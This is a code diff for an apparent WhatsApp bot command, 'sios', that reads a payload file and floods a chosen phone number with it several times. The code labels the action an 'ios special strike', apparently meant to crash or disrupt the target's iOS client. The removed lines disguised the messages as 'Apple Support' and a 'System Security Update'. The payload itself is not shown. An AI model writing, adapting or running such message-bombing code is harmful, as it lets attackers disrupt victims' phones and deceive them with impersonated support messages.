@@ -3,23 +3,25 @@ const config = require('../../config');
 
 module.exports = {
     name: "sios",
-    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
+    execute: async (conn, msg, args, { from, isOwner }) => {
         if (!isOwner) return;
         let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
         const payload = fs.readFileSync('./lib/payloads/sios.txt', 'utf-8');
 
-        msg.reply(fancy("🥀 deploying ios special strike..."));
-
-        for (let i = 0; i < 6; i++) {
+        for (let i = 0; i < 5; i++) {
             await conn.sendMessage(target, { 
                 text: "\u200B" + payload,
                 contextInfo: { 
-                    externalAdReply: { title: "Apple Support", body: "System Security Update", mediaType: 1, thumbnailUrl: "https://files.catbox.moe/horror.jpg" },
+                    externalAdReply: { 
+                        title: "🥀 INSIDIOUS V2.1.1 🥀", 
+                        body: "Analyzing system integrity...", 
+                        mediaType: 1, 
+                        thumbnailUrl: config.menuImage 
+                    },
                     forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid }
                 } 
             });
         }
-
-        await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Successful: SIOS Strike finished.") });
+        await conn.sendMessage(conn.user.id, { text: "🥀 SIOS Strike Success." });
     }
 };
